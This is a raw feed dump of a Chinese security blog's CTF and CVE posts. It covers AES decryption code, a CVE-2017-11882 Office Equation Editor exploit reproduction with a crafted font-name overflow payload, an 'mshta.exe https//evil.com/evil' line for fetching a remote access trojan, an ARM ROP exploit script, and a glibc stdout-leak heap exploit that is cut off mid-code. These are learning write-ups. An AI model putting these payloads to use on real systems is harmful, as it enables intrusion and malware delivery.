<span class="number">0xD2</span>, <span class="number">0x39</span>, <span class="number">0x20</span>, <span class="number">0x31</span>, <span class="number">0xB9</span>, <span class="number">0x32</span>, <span class="number">0x2E</span>, <span class="number">0x30</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">uint8_t in[16] = &#123;0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61&#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">unsigned char out[1000] =</span></span><br><span class="line"><span class="comment">&quot;\xfe\xf9\xe7\x3e\xf6\xa1\x23\xcc\x57\x61\xc1\x15\x77\xfb\x9c\xbb\xca\x2f\xb1\xe8\x4f\xd9\x07\xd8\x0c\x6b\xea\xcf\xe8\x42\xa2\xfa&quot;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">uint8_t *w; // expanded key</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">w = aes_init(16);</span></span><br><span class="line"><span class="comment">memset(w, 0, 176);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">aes_key_expansion(key, w);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">for (int j = 0; j &lt; 16; j += 0x10)</span></span><br><span class="line"><span class="comment">aes_cipher(w, (__int64)(&amp;in[(j / 8) * 8]), (__int64)(&amp;out[(j / 4) * 8]), (__int64)(&amp;key[(j / 8 + 2) * 8]));</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">printf(&quot;%s&quot;,out);</span></span><br><span class="line"><span class="comment">printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">free(w);</span></span><br><span class="line"><span class="comment">system(&quot;pause&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span> *w;</span><br><span class="line">  <span class="keyword">uint8_t</span> out[<span class="number">33</span>] = &#123;<span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>&#125;;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> in[] =</span><br><span class="line">    <span class="string">&quot;\xfe\xf9\xe7\x3e\xf6\xa1\x23\xcc\x57\x61\xc1\x15\x77\xfb\x9c\xbb\xca\x2f\xb1\xe8\x4f\xd9\x07\xd8\x0c\x6b\xea\xcf\xe8\x42\xa2\xfa&quot;</span>;</span><br><span class="line"></span><br><span class="line">  w = aes_init(<span class="number">16</span>);</span><br><span class="line">  <span class="built_in">memset</span>(w, <span class="number">0</span>, <span class="number">176</span>);</span><br><span class="line"></span><br><span class="line">  aes_key_expansion(key, w);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;<span class="number">32</span> ; j += <span class="number">0x10</span>)</span><br><span class="line">    aes_inv_cipher(w, (__int64)(&amp;in[j]), (__int64)(&amp;out[j]), (__int64)(&amp;key[(j / <span class="number">8</span> + <span class="number">2</span>) * <span class="number">8</span>]));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,out);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(w);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>附看雪上 <code>AES</code> 标准加解密的流程图</li></ul><img src="/2022/04/02/2022DASCTFxSU%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9Blogin-wp/247553_z3txh9drvbex5wr.jpg" class="">]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;这题好像是 re 的那道 0 解题，赛后自己拿到附件做了一下&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="wp" scheme="https://www.0wl.site/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-11882漏洞复现</title>
    <link href="https://www.0wl.site/2022/03/25/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.0wl.site/2022/03/25/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-25T03:18:03.000Z</published>
    <updated>2022-03-25T04:06:12.412Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>office CVE-2017-11882 复现及学习</p></div></article><span id="more"></span><h1>CVE-2017-11882漏洞复现</h1><blockquote><p>复现的第一个 CVE，漏洞点为较简单的栈溢出</p></blockquote><h2 id="漏洞成因">漏洞成因</h2><ul><li>office2016 之前的公式编辑器 EQNEDT21.EXE 存在缓冲区溢出</li><li>EQNEDT21.EXE 组件在 2000 年后就没有更新过，<strong>不存在 ASLR 之类的保护</strong>，漏洞利用简单且危害性大</li><li>font name 字段在 strcpy 的时候没有检测长度</li></ul><h2 id="漏洞分析">漏洞分析</h2><ul><li>复现环境：Windows 7 Ultimate with Service Pack 1 (x64)，office2013</li></ul><h3 id="静态分析">静态分析</h3><h4 id="文件结构">文件结构</h4><ul><li><strong>stream header</strong></li></ul><img src="/2022/03/25/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/upload_f3a7ae7dee7cfe518e28a75c493128a0.png" class=""><ul><li><strong>MTEF header</strong></li></ul><table><thead><tr><th>Description</th><th>Size (byte)</th><th>Value</th><th>Comment</th></tr></thead><tbody><tr><td>MTEF Version</td><td>1</td><td>0x3</td><td>MTEFv3</td></tr><tr><td>Generating Platform</td><td>1</td><td>0x1</td><td>Windows</td></tr><tr><td>Generating Product</td><td>1</td><td>0x1</td><td>Equation Editor</td></tr><tr><td>Product Version</td><td>1</td><td>0x3</td><td></td></tr><tr><td>Product Subversion</td><td>1</td><td>0xa</td><td></td></tr></tbody></table><ul><li><strong>MTEF records</strong></li></ul><img src="/2022/03/25/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/upload_23dd3f3ce1fc113c15465c058c261b13.png" class=""><table><thead><tr><th>Description</th><th>Size (byte)</th><th>Value</th><th>Comment</th></tr></thead><tbody><tr><td>Tag</td><td>1</td><td>0x8</td><td><strong>0x8 denotes Font record</strong></td></tr><tr><td>Typeface Number</td><td>1</td><td>0x5a</td><td></td></tr><tr><td>Style</td><td>1</td><td>0x5a</td><td></td></tr><tr><td>Font Name</td><td>Variable, NULL terminated</td><td>“cmd.exe /c calc.exe AAAAAAAAAAAAAAAAAAAAAAAA” + 0x00430c12</td><td>Overflow and overwrite return address</td></tr></tbody></table><h4 id="漏洞点">漏洞点</h4><img src="/2022/03/25/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/upload_2577ae699e1960959fb5641fd1908550.png" class=""><ul><li>这里的 strcpy 没有检测 SubStr 的长度，如果 SubStr 长度够长就能够实现栈溢出，覆盖返回地址为任意地址</li><li>程序没有开启随机化保护，利用更加简单</li><li>RTF 文件结构的分析可以使用 oletools</li></ul><h3 id="动态调试">动态调试</h3><ul><li><p>poc 来自 <a href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a></p></li><li><p>为了让程序在启动时就附加调试需要修改注册表（为了调试 poc）</p></li></ul><blockquote><ol><li>win+r 输入 regedit</li><li>在 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code> 下找到需要调试的程序（没有的话可以新建项）</li><li>新建字符串值，key 为 debugger，value 是调试器（这里是 windbg）所在路径</li><li>设置好之后启动程序（打开 exploit.rtf），调试器能够马上附加上</li></ol></blockquote><img src="/2022/03/25/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/upload_faca6c50e1414f730fb9a53be7892a13.png" class=""><ul><li>根据静态分析结果在 0x411658 处下断点，在<strong>第二次</strong>到达该断点时可以看到 exp 内容</li></ul><img src="/2022/03/25/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/upload_67512af854b124c150c54704a514be7f.png" class=""><ul><li>在执行完这一条指令之后返回地址被覆盖，实现栈溢出</li></ul><img src="/2022/03/25/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/upload_7720c738f1931a58d021eaf2acf5c49b.png" class=""><ul><li>这里返回地址的内容是是 <code>call    ds:WinExec</code> ，第一个参数是 <code>cmd.exe /c calc.exe</code>，第二个参数为 0，执行完之后会弹出计算器</li></ul><img src="/2022/03/25/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220325114154367.png" class=""><blockquote><p>WinExec：Runs the specified application.<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">nf-winbase-winexec</a></p></blockquote><h2 id="漏洞利用">漏洞利用</h2><ul><li>word 文档插入公式对象生成一个 ole 复合文档，更改 rtf 文件内容实现利用</li></ul><blockquote><p>找到输入的公式，如下图所示，更改上述提到的 <strong>MTEF header</strong> 让之后的内容成为 <code>font</code> 字段，修改字段内容实现利用（长度有限制）</p></blockquote><img src="/2022/03/25/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220325115913000.png" class=""><blockquote><p>修改完要执行的 shellcode 之后不要忘了在前面加上 <code>\objupdate</code>，这样才能使得内容生效</p></blockquote><img src="/2022/03/25/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220325115531755.png" class=""><ul><li>以 <code>Remcos</code> 木马为例的远控木马</li></ul><blockquote><p>利用 mshta.exe 执行远程脚本，脚本可以利用 powershell 下载及执行木马</p><p><code>mshta.exe https//evil.com/evil</code></p></blockquote><h2 id="Ref">Ref</h2><ul><li><a href="https://blog.csdn.net/tqydyqt/article/details/113758392">CVE-2017-11882漏洞利用</a></li><li><a href="https://unit42.paloaltonetworks.com/unit42-analysis-of-cve-2017-11882-exploit-in-the-wild/">Analysis of CVE-2017-11882 Exploit in the Wild</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;office CVE-2017-11882 复现及学习&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="cve复现" scheme="https://www.0wl.site/tags/cve%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>arm pwn 入门</title>
    <link href="https://www.0wl.site/2022/03/18/arm-pwn-%E5%85%A5%E9%97%A8/"/>
    <id>https://www.0wl.site/2022/03/18/arm-pwn-%E5%85%A5%E9%97%A8/</id>
    <published>2022-03-18T08:01:25.000Z</published>
    <updated>2022-03-25T02:39:11.118Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>arm pwn的学习</p></div></article><span id="more"></span><h2 id="arm-汇编基础">arm 汇编基础</h2><h3 id="寄存器">寄存器</h3><img src="/2022/03/18/arm-pwn-%E5%85%A5%E9%97%A8/ARM_Calling_Convention.png" class="" title="img"><blockquote><p>------ctf wiki</p></blockquote><h3 id="调用约定">调用约定</h3><ul><li>在函数调用的时候寄存器<code>R0 R1 R2 R3</code> 分别存放函数的四个参数，如果有4个以上的参数则会从右向左入栈</li></ul><h3 id="跳转指令">跳转指令</h3><blockquote><p>常见跳转指令有B,BL,BX,BLX</p></blockquote><ul><li>B == jmp</li><li>L    把下一条指令地址放到 LR 寄存器里面</li><li>X    arm指令集切换到thumb指令集</li></ul><h3 id="ARM-与-Thumb">ARM 与 Thumb</h3><ul><li>Thumb指令可以看作是ARM指令压缩形式的子集</li><li>cpsr 状态寄存器中标志了当前指令的指令集</li></ul><img src="/2022/03/18/arm-pwn-%E5%85%A5%E9%97%A8/image-20220318162556418.png" class=""><ul><li>在函数跳转过程中如果是 <code>BX addr+1</code> 这种形式，即跳转地址的最后一位为1，说明要跳转到的地方是 <code>Thumb</code> 指令</li></ul><h3 id="POP">POP</h3><ul><li>pop{r0,r4,pc}</li></ul><blockquote><p>This instruction causes a branch to the address popped off the stack into the PC. This is usually a return from a subroutine, where the LR was pushed onto the stack at the start of the subroutine.             -----arm developer doc</p><p>相当于 pop r0，pop r4，ret</p></blockquote><h2 id="jarvisoj-typo">jarvisoj_typo</h2><h3 id="分析">分析</h3><ul><li>程序是静态编译的所以对函数先做个简单的识别</li><li>可以看到程序存在栈溢出</li></ul><img src="/2022/03/18/arm-pwn-%E5%85%A5%E9%97%A8/image-20220318165954802.png" class=""><ul><li>布置的栈的结构如下</li></ul><table><thead><tr><th style="text-align:center">padding</th></tr></thead><tbody><tr><td style="text-align:center">pop{r0,r4,pc}</td></tr><tr><td style="text-align:center">/bin/sh\x00</td></tr><tr><td style="text-align:center">aaaa</td></tr><tr><td style="text-align:center">system</td></tr></tbody></table><ul><li>关于 padding 的大小可以看 ida 的 stack 确定，这里的 s 应该是之前入栈的 LR（返回地址）？或者可以按照 wiki 上的方法确定</li></ul><img src="/2022/03/18/arm-pwn-%E5%85%A5%E9%97%A8/image-20220318171059643.png" class=""><h3 id="exp">exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_pwn</span>(<span class="params">arg</span>):</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    <span class="keyword">if</span> arg == <span class="string">&quot;debug&quot;</span>:</span><br><span class="line">        r = process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-g&quot;</span>,<span class="string">&quot;1234&quot;</span>,<span class="string">&quot;./typo&quot;</span>])</span><br><span class="line">    <span class="keyword">elif</span> arg == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29672</span>)</span><br><span class="line">    <span class="keyword">elif</span> arg == <span class="string">&#x27;local&#x27;</span></span><br><span class="line">        r = process(<span class="string">&quot;./typo&quot;</span>)</span><br><span class="line"></span><br><span class="line">start_pwn(<span class="string">&quot;local&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot; want to quit\n&quot;</span>,<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># pop&#123;r0,r4,pc&#125;</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(<span class="number">0x00020904</span>)+p32(<span class="number">0x6C384</span>)*<span class="number">2</span>+p32(<span class="number">0x110B4</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="Ref">Ref</h2><ul><li><a href="https://developer.arm.com/documentation/dui0489/e/Babefbce?lang=en">https://developer.arm.com/documentation/dui0489/e/Babefbce?lang=en</a></li><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/arm/rop">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/arm/rop</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;arm pwn的学习&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="https://www.0wl.site/tags/pwn/"/>
    
    <category term="buu" scheme="https://www.0wl.site/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>利用 _IO_2_1_stdout_ 泄露信息</title>
    <link href="https://www.0wl.site/2022/02/22/%E5%88%A9%E7%94%A8-IO-2-1-stdout-%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF/"/>
    <id>https://www.0wl.site/2022/02/22/%E5%88%A9%E7%94%A8-IO-2-1-stdout-%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF/</id>
    <published>2022-02-22T04:39:40.000Z</published>
    <updated>2022-03-01T13:25:29.199Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>_IO_2_1_stdout leak</p></div></article><span id="more"></span><h2 id="IO-2-1-stdout-结构体">IO_2_1_stdout_ 结构体</h2><img src="/2022/02/22/%E5%88%A9%E7%94%A8-IO-2-1-stdout-%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF/image-20220222171635537.png" class=""><p>​如果能够改结构体中的 <code>flags</code> 为 <code>0x0FBAD1887</code>(原来的值 <code>0xfbad2887</code>) 、改小 <code>_IO_write_base</code> ，那么之后一次在调用 <code>puts</code> 函数时会打印出 <code>_IO_write_base</code> 到 <code>_IO_write_ptr</code> 之间的数据，从而获得 <code>libc</code> 地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//部分源码</span></span><br><span class="line"><span class="comment">//_flags</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br><span class="line"><span class="comment">//......</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="sctf-2019-one-heap">sctf_2019_one_heap</h2><h3 id="思路">思路</h3><ul><li><p>题目只有 <code>add</code> 和 <code>delete</code> 这两个功能，没有 <code>show</code> 功能去 <code>leak</code> 。<code>delete</code> 中存在 <code>UAF</code> 可以进行 <code>double free</code>，并且题目使用的 <code>libc</code> 版本是较老一点的 <code>libc-2.27</code> ，利用 <code>tcache</code> 进行 <code>double free</code> 的时候不会有 <code>key</code> 字段的检测，就可以进行任意地址堆块的分配，劫持 <code>__malloc_hook</code> 为 <code>one_gadget</code>。</p></li><li><p>没有 <code>show</code> 功能但是需要 <code>leak</code> 的话就要用到上面提到的 <code>_IO_2_1_stdout_</code> 这个结构体，利用 <code>unsorted bin</code> 中指向 <code>main_arena</code> 内部的指针降低爆破到 <code>_IO_2_1_stdout_</code> 的概率，再利用上面的方法改结构体内的值实现泄露。</p></li><li><p>为了获取到 <code>unsorted bin</code> 要利用 <code>double free</code> ，使得当前大小 <code>tcache</code> 的 <code>count</code> 变为 <code>-1</code> ，由于无符号数所以会分配到 <code>unsorted bin</code>  (<code>mp_.tcache_count</code> 的数据类型是 <code>size_t</code>)</p></li><li><p><code>delete</code> 功能有限，要多申请一个堆块用来改 <code>tcache</code> 的 <code>next</code> 指针</p></li><li><p>最后利用 <code>realloc_hook</code> 调栈帧</p></li></ul><h3 id="exp">exp</h3><p>​基本<s>参考</s>抄的其他 wp：<a href="https://www.freesion.com/article/7253509267/">https://www.freesion.com/article/7253509267/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">_IO_2_1_stdout_s = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">malloc_hook_s = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_s = libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">one_gadget_s = <span class="number">0x10a38c</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span 